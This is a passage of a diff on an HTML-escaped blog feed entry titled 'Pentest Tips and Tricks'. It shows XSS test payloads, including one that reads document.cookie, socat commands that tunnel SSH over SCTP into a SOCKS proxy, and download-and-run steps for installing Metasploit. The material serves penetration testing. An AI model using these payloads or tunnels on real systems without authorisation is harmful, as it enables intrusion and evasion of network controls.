 &amp;lt;BODY &lt;span class=&quot;nv&quot;&gt;BACKGROUND&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;javascript:alert(&amp;#39;XSS&amp;#39;)&amp;quot;&lt;/span&gt;&amp;gt;
 &amp;lt;FRAMESET&amp;gt;&amp;lt;FRAME &lt;span class=&quot;nv&quot;&gt;SRC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;”javascript:alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;XSS&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;gt;&amp;lt;/FRAMESET&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;script &amp;gt;alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;document.cookie&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;lt;/script&amp;gt;
@@ -3300,18 +3301,39 @@ or
 
 &lt;h3 id=&quot;ssh-over-sctp-with-socat&quot;&gt;SSH Over SCTP (With Socat)&lt;/h3&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# on remote server &lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# on remote server&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# assuming you want the SCTP socket to listen on port 80/SCTP and sshd is on 22/TCP&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;socat SCTP-LISTEN:80,fork TCP:localhost:22
 
-&lt;span class=&quot;c&quot;&gt;# localhost &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# localhost&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# replace SERVER_IP with IP of listening server, and 80 with whatever port the SCTP listener is on :)&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80 
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80
 
 &lt;span class=&quot;c&quot;&gt;# create socks proxy&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# replace username and -p port value as needed...&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh -lusername localhost -D &lt;span class=&quot;m&quot;&gt;8080&lt;/span&gt; -p 1337&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
+&lt;h3 id=&quot;install-metasploit-community-edition-in-kali-20&quot;&gt;Install Metasploit Community Edition in Kali 2.0&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# github urls&lt;/span&gt;
+https://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version
+
+wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; chmod
++x metasploit-latest-linux-x64-installer.run &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./metasploit-latest-linux-x64-installer.run
+
+&lt;span class=&quot;c&quot;&gt;# create user&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/opt/metasploit/createuser
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;*&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Please enter a username: root
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;*&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating user &lt;span class=&quot;s1&quot;&gt;&amp;#39;root&amp;#39;&lt;/span&gt; with password &lt;span class=&quot;s1&quot;&gt;&amp;#39;LsRRV[I^5&amp;#39;&lt;/span&gt; ...
+
+&lt;span class=&quot;c&quot;&gt;# activate your metasploit license&lt;/span&gt;
+https://localhost:3790
+
+&lt;span class=&quot;c&quot;&gt;# update metasploite&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/opt/metasploit/app/msfupdate
+
+&lt;span class=&quot;c&quot;&gt;# use msfconsole&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/opt/metasploit/app/msfconsole&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
   &lt;p&gt;&lt;a href=&quot;https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/&quot;&gt;Pentest Tips and Tricks&lt;/a&gt; was originally published by EK at &lt;a href=&quot;https://jivoi.github.io&quot;&gt;EK&lt;/a&gt; on July 01, 2015.&lt;/p&gt;</content>
 </entry>
